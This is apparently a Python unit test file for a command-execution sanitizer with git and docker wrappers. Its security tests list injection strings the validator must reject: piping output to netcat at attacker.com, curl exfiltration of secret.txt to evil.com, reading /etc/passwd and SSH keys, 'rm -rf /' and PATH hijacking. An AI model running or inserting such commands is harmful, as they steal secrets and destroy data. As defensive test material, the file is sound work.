"""Unit tests for SecureExecutor."""

import pytest
from unittest.mock import patch, Mock
from core.utils.secure_executor import (
    SecureExecutor, 
    CommandExecutionError,
    GitOperations,
    DockerOperations
)


class TestSecureExecutor:
    """Test cases for SecureExecutor."""
    
    def test_validate_command_allowed(self):
        """Test validation of allowed commands."""
        allowed_commands = ['ls', 'grep', 'python', 'git']
        
        for cmd in allowed_commands:
            # Should not raise exception
            SecureExecutor.validate_command(cmd)
    
    def test_validate_command_disallowed(self):
        """Test validation blocks disallowed commands."""
        disallowed_commands = ['rm', 'sudo', 'chmod', 'unknown_command']
        
        for cmd in disallowed_commands:
            with pytest.raises(CommandExecutionError):
                SecureExecutor.validate_command(cmd)
    
    def test_validate_command_dangerous_patterns(self):
        """Test validation blocks dangerous patterns."""
        dangerous_commands = [
            'ls; rm -rf /',
            'grep pattern | malicious',
            'echo $(cat /etc/passwd)',
            'ls && dangerous_command',
            'ls\nrm file',
        ]
        
        for cmd in dangerous_commands:
            with pytest.raises(CommandExecutionError):
                SecureExecutor.validate_command(cmd)
    
    def test_sanitize_argument(self):
        """Test argument sanitization."""
        test_cases = [
            ('normal_arg', 'normal_arg'),
            ('arg with spaces', "'arg with spaces'"),
            ('arg;with;semicolons', "'argwithsemicolons'"),
            ('arg|with|pipes', "'argwithpipes'"),
            ('arg&with&ampersands', "'argwithampersands'"),
        ]
        
        for input_arg, expected in test_cases:
            result = SecureExecutor.sanitize_argument(input_arg)
            # The exact quoting may vary, but dangerous chars should be removed/escaped
            assert ';' not in result or result.startswith("'")
            assert '|' not in result or result.startswith("'")
            assert '&' not in result or result.startswith("'")
    
    @patch('subprocess.run')
    def test_execute_command_success(self, mock_run):
        """Test successful command execution."""
        mock_result = Mock()
        mock_result.returncode = 0
        mock_result.stdout = 'command output'
        mock_result.stderr = ''
        mock_run.return_value = mock_result
        
        returncode, stdout, stderr = SecureExecutor.execute_command(['ls', '-l'])
        
        assert returncode == 0
        assert stdout == 'command output'
        assert stderr == ''
        mock_run.assert_called_once()
    
    @patch('subprocess.run')
    def test_execute_command_with_timeout(self, mock_run):
        """Test command execution with timeout."""
        from subprocess import TimeoutExpired
        mock_run.side_effect = TimeoutExpired('ls', 5)
        
        with pytest.raises(CommandExecutionError) as exc_info:
            SecureExecutor.execute_command(['ls'], timeout=5)
        
        assert 'timed out' in str(exc_info.value)
    
    def test_execute_command_empty_list(self):
        """Test execution with empty command list."""
        with pytest.raises(CommandExecutionError):
            SecureExecutor.execute_command([])
    
    def test_execute_command_disallowed(self):
        """Test execution of disallowed command."""
        with pytest.raises(CommandExecutionError):
            SecureExecutor.execute_command(['rm', '-rf', '/'])
    
    @patch('subprocess.run')
    def test_execute_safe_with_template(self, mock_run):
        """Test execute_safe with command template."""
        mock_result = Mock()
        mock_result.returncode = 0
        mock_result.stdout = 'pattern found'
        mock_result.stderr = ''
        mock_run.return_value = mock_result
        
        returncode, stdout, stderr = SecureExecutor.execute_safe(
            'grep {pattern} {file}',
            {'pattern': 'test', 'file': 'data.txt'}
        )
        
        assert returncode == 0
        assert stdout == 'pattern found'
        
        # Verify subprocess was called with sanitized arguments
        call_args = mock_run.call_args[0][0]
        assert 'grep' in call_args
        # Arguments should be sanitized
        assert any('test' in str(arg) for arg in call_args)
        assert any('data.txt' in str(arg) for arg in call_args)
    
    def test_execute_safe_missing_argument(self):
        """Test execute_safe with missing template argument."""
        with pytest.raises(CommandExecutionError) as exc_info:
            SecureExecutor.execute_safe(
                'grep {pattern} {file}',
                {'pattern': 'test'}  # missing 'file'
            )
        
        assert 'Missing argument: file' in str(exc_info.value)


class TestGitOperations:
    """Test cases for GitOperations."""
    
    @patch('core.utils.secure_executor.SecureExecutor.execute_command')
    def test_get_status(self, mock_execute):
        """Test git status operation."""
        mock_execute.return_value = (0, 'M file.txt\n?? new_file.txt', '')
        
        returncode, stdout, stderr = GitOperations.get_status()
        
        assert returncode == 0
        assert 'file.txt' in stdout
        mock_execute.assert_called_once_with(['git', 'status', '--porcelain'])
    
    @patch('core.utils.secure_executor.SecureExecutor.execute_command')
    def test_get_log(self, mock_execute):
        """Test git log operation."""
        mock_execute.return_value = (0, 'abc123 Initial commit\ndef456 Second commit', '')
        
        returncode, stdout, stderr = GitOperations.get_log(limit=5)
        
        assert returncode == 0
        assert 'Initial commit' in stdout
        mock_execute.assert_called_once_with(['git', 'log', '--max-count=5', '--oneline'])
    
    @patch('core.utils.secure_executor.SecureExecutor.sanitize_argument')
    @patch('core.utils.secure_executor.SecureExecutor.execute_command')
    def test_add_file(self, mock_execute, mock_sanitize):
        """Test git add file operation."""
        mock_sanitize.return_value = "'test_file.txt'"
        mock_execute.return_value = (0, '', '')
        
        returncode, stdout, stderr = GitOperations.add_file('test_file.txt')
        
        assert returncode == 0
        mock_sanitize.assert_called_once_with('test_file.txt')
        mock_execute.assert_called_once_with(['git', 'add', "'test_file.txt'"])


class TestDockerOperations:
    """Test cases for DockerOperations."""
    
    @patch('core.utils.secure_executor.SecureExecutor.execute_command')
    def test_list_containers(self, mock_execute):
        """Test docker container listing."""
        mock_execute.return_value = (0, 'CONTAINER ID   IMAGE   STATUS\nabc123   nginx   Up', '')
        
        returncode, stdout, stderr = DockerOperations.list_containers()
        
        assert returncode == 0
        assert 'nginx' in stdout
        mock_execute.assert_called_once_with(['docker', 'ps', '-a'])
    
    @patch('core.utils.secure_executor.SecureExecutor.sanitize_argument')
    @patch('core.utils.secure_executor.SecureExecutor.execute_command')
    def test_get_logs(self, mock_execute, mock_sanitize):
        """Test docker logs retrieval."""
        mock_sanitize.return_value = "'nginx_container'"
        mock_execute.return_value = (0, 'nginx log output', '')
        
        returncode, stdout, stderr = DockerOperations.get_logs('nginx_container', tail=50)
        
        assert returncode == 0
        assert 'nginx log output' in stdout
        mock_sanitize.assert_called_once_with('nginx_container')
        mock_execute.assert_called_once_with(['docker', 'logs', '--tail=50', "'nginx_container'"])
    
    @patch('core.utils.secure_executor.SecureExecutor.sanitize_argument')
    @patch('core.utils.secure_executor.SecureExecutor.execute_command')
    def test_execute_in_container(self, mock_execute, mock_sanitize):
        """Test command execution in container."""
        mock_sanitize.return_value = "'nginx_container'"
        mock_execute.return_value = (0, 'command output', '')
        
        returncode, stdout, stderr = DockerOperations.execute_in_container(
            'nginx_container', 
            ['ls', '-la']
        )
        
        assert returncode == 0
        assert 'command output' in stdout
        mock_sanitize.assert_called_once_with('nginx_container')
        expected_command = ['docker', 'exec', "'nginx_container'", 'ls', '-la']
        mock_execute.assert_called_once_with(expected_command)


class TestSecurityValidation:
    """Test security validation features."""
    
    def test_shell_injection_prevention(self):
        """Test that shell injection attempts are blocked."""
        malicious_commands = [
            'ls; cat /etc/passwd',
            'grep pattern file.txt | nc attacker.com 1234',
            'echo test && curl evil.com/steal?data=$(cat secret.txt)',
            'ls `whoami`',
            'grep $(malicious_command) file.txt',
        ]
        
        for cmd in malicious_commands:
            with pytest.raises(CommandExecutionError):
                SecureExecutor.validate_command(cmd)
    
    def test_path_traversal_prevention(self):
        """Test that path traversal attempts are sanitized."""
        malicious_paths = [
            '../../../etc/passwd',
            '../../../../root/.ssh/id_rsa',
            './../../secret_file',
        ]
        
        for path in malicious_paths:
            sanitized = SecureExecutor.sanitize_argument(path)
            # Path should be quoted/escaped to prevent traversal
            assert sanitized.startswith("'") or '..' not in sanitized
    
    def test_command_whitelist_enforcement(self):
        """Test that only whitelisted commands are allowed."""
        # Test that extending the whitelist works
        original_allowed = SecureExecutor.ALLOWED_COMMANDS.copy()
        
        try:
            # Temporarily add a command
            SecureExecutor.ALLOWED_COMMANDS.add('custom_command')
            
            # Should now be allowed
            SecureExecutor.validate_command('custom_command')
            
            # Remove it again
            SecureExecutor.ALLOWED_COMMANDS.remove('custom_command')
            
            # Should now be disallowed
            with pytest.raises(CommandExecutionError):
                SecureExecutor.validate_command('custom_command')
                
        finally:
            # Restore original whitelist
            SecureExecutor.ALLOWED_COMMANDS = original_allowed
    
    def test_environment_variable_injection_prevention(self):
        """Test prevention of environment variable injection."""
        malicious_args = [
            'file.txt; export MALICIOUS=value',
            'normal_file.txt && export PATH=/malicious/path:$PATH',
            '$SECRET_VAR',
            '${SECRET_VAR}',
        ]
        
        for arg in malicious_args:
            sanitized = SecureExecutor.sanitize_argument(arg)
            # Environment variable syntax should be escaped/removed
            assert '$' not in sanitized or sanitized.startswith("'")
            assert ';' not in sanitized or sanitized.startswith("'")
            assert '&&' not in sanitized or sanitized.startswith("'")